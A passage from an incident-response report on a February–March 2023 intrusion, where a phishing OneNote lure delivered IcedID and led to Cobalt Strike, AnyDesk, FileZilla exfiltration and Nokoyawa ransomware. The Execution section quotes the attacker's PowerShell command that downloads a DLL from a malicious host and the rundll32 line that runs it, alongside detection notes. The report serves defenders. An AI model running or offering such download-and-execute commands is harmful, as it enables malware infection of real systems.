		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Friday, October 25, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-30547" class="post-30547 post type-post status-publish format-standard hentry category-adfind category-exfiltrate-data category-icedid category-nokoyawa category-ransomware entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
		
			<a class="category-color-97" href="https://thedfirreport.com/category/exfiltrate-data/">Exfiltrate Data</a>
		
			<a class="category-color-67" href="https://thedfirreport.com/category/icedid/">icedid</a>
		
			<a class="category-color-111" href="https://thedfirreport.com/category/nokoyawa/">nokoyawa</a>
		
			<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">From OneNote to RansomNote: An Ice Cold Intrusion</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" rel="bookmark"><time class="entry-date published" datetime="2024-04-01T00:04:14+00:00">April 1, 2024</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 id="key" class="wp-block-heading"><a href="#key">Key Takeaways</a></h2>



<ul class="wp-block-list">
<li style="list-style-type: none;">
<ul></ul>
</li>
</ul>
<ul>
<li>In late February 2023, threat actors rode a wave of <a class="ql-link" href="https://inquest.net/blog/youve-got-malware-rise-threat-actors-using-microsoft-onenote-malicious-campaigns/" target="_blank" rel="noopener noreferrer">initial access using Microsoft OneNote</a> files. In this case, we observed a threat actor deliver IcedID using this method.</li>
<li>After loading <a class="ql-link" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid" target="_blank" rel="noopener noreferrer">IcedID</a> and establishing persistence, there were no further actions, other than beaconing for over 30 days.</li>
<li>The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server.</li>
<li>The threat actor used FileZilla to exfiltrate data from the network before deploying <a class="ql-link" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.nokoyawa" target="_blank" rel="noopener noreferrer">Nokoyawa ransomware</a>.</li>
</ul>
<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/" target="_blank" rel="noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/reports/id1728699064" target="_blank" rel="noopener">Apple</a>, <a href="https://www.youtube.com/@TheDFIRReport/videos" target="_blank" rel="noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp" target="_blank" rel="noopener">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports" target="_blank" rel="noopener">Amazon</a>.</p>
<p>Please consider leaving feedback on this report <a href="https://forms.office.com/r/YY6w3gwd6A" target="_blank" rel="noopener">here</a>.</p>
<h2 id="services" class="wp-block-heading"><a href="#services">Services</a></h2>
<p>

</p>
<p>We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started.</p>
<p>

</p>
<p>Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing.</p>
<p>

</p>
<p>Our comprehensive &#8220;All Intel&#8221; service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data.</p>
<p>

</p>
<p>Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&amp;CK and accompanied by a test example.</p>
<p><a href="https://thedfirreport.com/contact/" target="_blank" rel="noopener">Contact us</a> for a demo or free trial today!</p>

<h4>Table of Contents:</h4>
<ul>
<li><a href="#case-summary">Case Summary</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#initial-access">Initial Access</a></li>
<li><a href="#execution">Execution</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#defense-evasion">Defense Evasion</a></li>
<li><a href="#credential-access">Credential Access</a></li>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#lateral-movement">Lateral Movement</a></li>
<li><a href="#collection">Collection</a></li>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#exfiltration">Exfiltration</a></li>
<li><a href="#impact">Impact</a></li>
<li><a href="#timeline">Timeline</a></li>
<li><a href="#diamond-model">Diamond Model</a></li>
<li><a href="#indicators">Indicators</a></li>
<li><a href="#detections">Detections</a></li>
<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
</ul>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had <a href="https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware" target="_blank" rel="noreferrer noopener">surged in popularity</a> among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit&#8217;s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server&#8217;s desktop, verifying their objective was complete.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack&#8217;s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days.</p>
<p>One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by <a href="https://blogs.microsoft.com/on-the-issues/2023/04/06/stopping-cybercriminals-from-abusing-security-tools/">Microsoft, Fortra and Health-ISAC</a> a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit.</p>
<p>Please consider leaving feedback on this report <a href="https://forms.office.com/r/YY6w3gwd6A" target="_blank" rel="noopener">here</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading --><!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Analysis and reporting completed by <a href="https://twitter.com/iiamaleks" target="_blank" rel="noreferrer noopener">@iiamaleks</a>, <a href="https://twitter.com/IrishD34TH" target="_blank" rel="noopener">@IrishD34TH</a>, and <a href="https://twitter.com/Miixxedup" target="_blank" rel="noopener">@Miixxedup</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified &#8220;secure message.&#8221; The campaign was documented in open-source threat intelligence by <a href="https://x.com/pr0xylife/status/1628155747040210945?s=20" target="_blank" rel="noreferrer noopener">pr0xylife</a> on their <a href="https://github.com/pr0xylife/IcedID/blob/main/icedID_21.02.2023.txt" target="_blank" rel="noreferrer noopener">GitHub repository</a>. The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named &#8220;O p e n.cmd&#8221; was hidden behind a large button marked &#8220;Open&#8221; in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-30642" src="https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12.png" alt="" width="3305" height="1853" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12.png 3305w, https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12-300x168.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12-1024x574.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12-768x431.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12-1536x861.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/Untitled12-2048x1148.png 2048w" sizes="(max-width: 3305px) 100vw, 3305px" /></p>
<!-- /wp:image -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-002.png"><img decoding="async" class="aligncenter size-full wp-image-30554" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-002.png" alt="" width="3084" height="1224" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-002.png 3084w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-002-300x119.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-002-1024x406.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-002-768x305.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-002-1536x610.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-002-2048x813.png 2048w" sizes="(max-width: 3084px) 100vw, 3084px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-003.png"><img decoding="async" class="aligncenter size-full wp-image-30555" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-003.png" alt="" width="2647" height="284" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-003.png 2647w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-003-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-003-1024x110.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-003-768x82.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-003-1536x165.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-003-2048x220.png 2048w" sizes="(max-width: 2647px) 100vw, 2647px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The metadata of the O p e n.cmd batch file can be <a href="https://www.virustotal.com/gui/file/681217e6c8ed3ed37c1312646afb8e0cfe25e6840f461d10a7d9cdd4ffa725cb" target="_blank" rel="noreferrer noopener">found on VirusTotal</a>, and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/3333.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-31005 size-full" src="https://thedfirreport.com/wp-content/uploads/2024/04/3333.png" alt="" width="1885" height="897" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/3333.png 1885w, https://thedfirreport.com/wp-content/uploads/2024/04/3333-300x143.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/3333-1024x487.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/3333-768x365.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/3333-1536x731.png 1536w" sizes="(max-width: 1885px) 100vw, 1885px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. </p>
<pre>powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\programdata\COIm.jpg</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\programdata\ using a filename that looks like a JPEG image. The real filetype is actually a DLL:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30556" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-004.png" alt="" width="866" height="37" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-004.png 866w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-004-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-004-768x33.png 768w" sizes="(max-width: 866px) 100vw, 866px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The file was then run using rundll32.</p>
<pre>rundll32 c:\programdata\COIm.jpg,init</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Execution of Cobalt Strike Beacon</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>On the 33rd day of the intrusion, the IcedID malware was observed dropping several files.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30557" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-005.png" alt="" width="557" height="350" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-005.png 557w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-005-300x189.png 300w" sizes="(max-width: 557px) 100vw, 557px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user&#8217;s AppData\Local\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named &#8220;Funa2.exe&#8221; from the same Temp directory.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30558" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-006.png" alt="" width="1810" height="190" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-006.png 1810w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-006-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-006-1024x107.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-006-768x81.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-006-1536x161.png 1536w" sizes="(max-width: 1810px) 100vw, 1810px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30559" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-007.png" alt="" width="1790" height="347" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-007.png 1790w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-007-300x58.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-007-1024x199.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-007-768x149.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-007-1536x298.png 1536w" sizes="(max-width: 1790px) 100vw, 1790px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30560" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-008.png" alt="" width="1714" height="364" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-008.png 1714w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-008-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-008-1024x217.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-008-768x163.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-008-1536x326.png 1536w" sizes="(max-width: 1714px) 100vw, 1714px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30561" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-009.png" alt="" width="2035" height="226" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-009.png 2035w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-009-300x33.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-009-1024x114.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-009-768x85.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-009-1536x171.png 1536w" sizes="(max-width: 2035px) 100vw, 2035px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The default Cobalt Strike pipes are (the “*” symbolize the prefix/suffix):</p>
<pre>\postex_*<br />\postex_ssh_*<br />\status_*<br />\msagent_*<br />\MSSE-*<br />\*-server</pre>
<p>More strategies for detecting Cobalt Strike can be found in <a href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/" target="_blank" rel="noreferrer noopener">Cobalt Strike, a Defender&#8217;s Guide part 1</a> and <a href="https://thedfirreport.com/2022/01/24/cobalt-strike-a-defenders-guide-part-2/" target="_blank" rel="noreferrer noopener">part 2</a>. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>Cadiak.dll</strong>: IcedID first stage.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>license.dat</strong>: Encoded version of the second stage, which gets loaded into memory by the first stage.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence.</p>
<pre>&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;URI&gt;\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}&lt;/URI&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;LogonTrigger id="LogonTrigger"&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;UserId&gt;[REDACTED]&lt;/UserId&gt;
    &lt;/LogonTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
      &lt;UserId&gt;[REDACTED]&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
